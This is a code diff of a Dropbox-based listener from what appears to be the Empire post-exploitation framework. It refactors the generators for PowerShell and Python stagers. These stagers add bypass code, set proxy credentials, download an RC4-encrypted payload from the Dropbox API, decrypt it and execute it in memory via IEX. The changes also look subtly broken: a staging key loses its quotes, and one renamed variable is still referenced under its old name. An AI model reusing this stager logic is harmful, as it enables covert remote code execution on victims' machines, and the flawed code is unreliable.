@@ -187,14 +187,14 @@ class Listener(object):
                 "options"
             ]
             # host = listenerOptions['Host']['Value']
-            stagingKey = listenerOptions["StagingKey"]["Value"]
+            staging_key = listenerOptions["StagingKey"]["Value"]
             profile = listenerOptions["DefaultProfile"]["Value"]
             launcher = listenerOptions["Launcher"]["Value"]
-            stagingKey = listenerOptions["StagingKey"]["Value"]
+            staging_key = listenerOptions["StagingKey"]["Value"]
             pollInterval = listenerOptions["PollInterval"]["Value"]
-            apiToken = listenerOptions["APIToken"]["Value"]
+            api_token = listenerOptions["APIToken"]["Value"]
             baseFolder = listenerOptions["BaseFolder"]["Value"].strip("/")
-            stagingFolder = "/%s/%s" % (
+            staging_folder = "/%s/%s" % (
                 baseFolder,
                 listenerOptions["StagingFolder"]["Value"].strip("/"),
             )
@@ -213,135 +213,69 @@ class Listener(object):
                 # replace with stager = '' for troubleshooting
                 stager = '$ErrorActionPreference = "SilentlyContinue";'
                 if safeChecks.lower() == "true":
-                    stager = helpers.randomize_capitalization(
-                        "If($PSVersionTable.PSVersion.Major -ge 3){"
-                    )
+                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+
                     for bypass in bypasses:
                         stager += bypass
-                    stager += "};"
-                    stager += helpers.randomize_capitalization(
-                        "[System.Net.ServicePointManager]::Expect100Continue=0;"
-                    )
+                    stager += "};[System.Net.ServicePointManager]::Expect100Continue=0;"
 
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + "=New-Object System.Net.WebClient;"
-                )
+                stager += "$wc=New-Object System.Net.WebClient;"
 
                 if userAgent.lower() == "default":
                     profile = listenerOptions["DefaultProfile"]["Value"]
                     userAgent = profile.split("|")[1]
-                stager += "$u='" + userAgent + "';"
+                stager += f"$u='{ userAgent }';"
 
                 if userAgent.lower() != "none" or proxy.lower() != "none":
 
                     if userAgent.lower() != "none":
-                        stager += helpers.randomize_capitalization(
-                            "$"
-                            + helpers.generate_random_script_var_name("wc")
-                            + ".Headers.Add("
-                        )
-                        stager += "'User-Agent',$u);"
+                        stager += "$wc.Headers.Add('User-Agent',$u);"
 
                     if proxy.lower() != "none":
                         if proxy.lower() == "default":
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
+                            stager += (
+                                "$wc.Proxy=[System.Net.WebRequest]::DefaultWebProxy;"
                             )
+
                         else:
                             # TODO: implement form for other proxy
-                            stager += helpers.randomize_capitalization(
-                                "$proxy=New-Object Net.WebProxy;"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$proxy.Address = '" + proxy.lower() + "';"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy = $proxy;"
-                            )
+                            stager += "$proxy=New-Object Net.WebProxy;"
+                            stager += f"$proxy.Address = '{ proxy.lower() }';"
+                            stager += "$wc.Proxy = $proxy;"
+
                         if proxyCreds.lower() == "default":
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
-                            )
+                            stager += "$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;"
+
                         else:
                             # TODO: implement form for other proxy credentials
                             username = proxyCreds.split(":")[0]
                             password = proxyCreds.split(":")[1]
                             domain = username.split("\\")[0]
                             usr = username.split("\\")[1]
-                            stager += (
-                                "$netcred = New-Object System.Net.NetworkCredential('"
-                                + usr
-                                + "','"
-                                + password
-                                + "','"
-                                + domain
-                                + "');"
-                            )
-                            stager += helpers.randomize_capitalization(
-                                "$"
-                                + helpers.generate_random_script_var_name("wc")
-                                + ".Proxy.Credentials = $netcred;"
-                            )
+                            stager += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{ password }', '{ domain }');"
+                            stager += "$wc.Proxy.Credentials = $netcred;"
 
                         # save the proxy settings to use during the entire staging process and the agent
-                        stager += (
-                            "$Script:Proxy = $"
-                            + helpers.generate_random_script_var_name("wc")
-                            + ".Proxy;"
-                        )
+                        stager += "$Script:Proxy = $wc.Proxy;"
 
                 # TODO: reimplement stager retries?
 
                 # code to turn the key string into a byte array
-                stager += helpers.randomize_capitalization(
-                    "$K=[System.Text.Encoding]::ASCII.GetBytes("
-                )
-                stager += "'%s');" % (stagingKey)
+                stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes({ staging_key });"
 
                 # this is the minimized RC4 stager code from rc4.ps1
-                stager += helpers.randomize_capitalization(
-                    "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
-                )
+                stager += "$R={$D,$K=$Args;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.Count])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxor$S[($S[$I]+$S[$H])%256]}};"
 
                 # add in the Dropbox auth token and API params
-                stager += "$t='%s';" % (apiToken)
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + ".Headers.Add("
-                )
-                stager += '"Authorization","Bearer $t");'
-                stager += helpers.randomize_capitalization(
-                    "$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + ".Headers.Add("
-                )
-                stager += '"Dropbox-API-Arg",\'{"path":"%s/debugps"}\');' % (
-                    stagingFolder
-                )
+                stager += f"$t='{ api_token }';"
+                stager += '$wc.Headers.Add("Authorization","Bearer $t");'
+                stager += f'$wc.Headers.Add("Dropbox-API-Arg",\'{"path":"{ staging_folder }/debugps"}\');'
 
-                stager += helpers.randomize_capitalization(
-                    "$data=$"
-                    + helpers.generate_random_script_var_name("wc")
-                    + ".DownloadData('"
-                )
-                stager += "https://content.dropboxapi.com/2/files/download');"
-                stager += helpers.randomize_capitalization(
-                    "$iv=$data[0..3];$data=$data[4..$data.length];"
-                )
+                stager += "$data=$wc.DownloadData('https://content.dropboxapi.com/2/files/download');"
+                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
                 # decode everything and kick it over to IEX to kick off execution
-                stager += helpers.randomize_capitalization(
-                    "-join[Char[]](& $R $data ($IV+$K))|IEX"
-                )
+                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
 
                 if obfuscate:
                     stager = data_util.obfuscate(
@@ -383,7 +317,7 @@ class Listener(object):
 
                 launcherBase += "import urllib.request;\n"
                 launcherBase += "UA='%s';" % (userAgent)
-                launcherBase += "t='%s';" % (apiToken)
+                launcherBase += "t='%s';" % (api_token)
                 launcherBase += (
                     "server='https://content.dropboxapi.com/2/files/download';"
                 )
@@ -393,7 +327,7 @@ class Listener(object):
                 launcherBase += 'req.add_header("Authorization","Bearer "+t);'
                 launcherBase += (
                     'req.add_header("Dropbox-API-Arg",\'{"path":"%s/debugpy"}\');\n'
-                    % (stagingFolder)
+                    % (staging_folder)
                 )
 
                 if proxy.lower() != "none":
@@ -437,7 +371,7 @@ class Listener(object):
                 launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += "IV=a[0:4];"
                 launcherBase += "data=a[4:];"
-                launcherBase += "key=IV+'%s';" % (stagingKey)
+                launcherBase += "key=IV+'%s';" % (staging_key)
 
                 # RC4 decryption
                 launcherBase += "S,j,out=list(range(256)),0,[]\n"
@@ -514,29 +448,26 @@ class Listener(object):
             if workingHours != "":
                 stager = stager.replace("WORKING_HOURS_REPLACE", workingHours)
 
-            randomizedStager = ""
+            unobfuscated_stager = ""
 
             for line in stager.split("\n"):
                 line = line.strip()
                 # skip commented line
                 if not line.startswith("#"):
-                    # randomize capitalization of lines without quoted strings
-                    if '"' not in line:
-                        randomizedStager += helpers.randomize_capitalization(line)
-                    else:
-                        randomizedStager += line
+                    unobfuscated_stager += line
 
             # base64 encode the stager and return it
             if encode:
-                return helpers.enc_powershell(randomizedStager)
+                return helpers.enc_powershell(unobfuscated_stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey.encode("UTF-8"), randomizedStager.encode("UTF-8")
+                    RC4IV + stagingKey.encode("UTF-8"),
+                    unobfuscated_stager.encode("UTF-8"),
                 )
             else:
                 # otherwise just return the case-randomized stager
-                return randomizedStager
+                return unobfuscated_stager
 
         elif language.lower() == "python":
             template_path = [
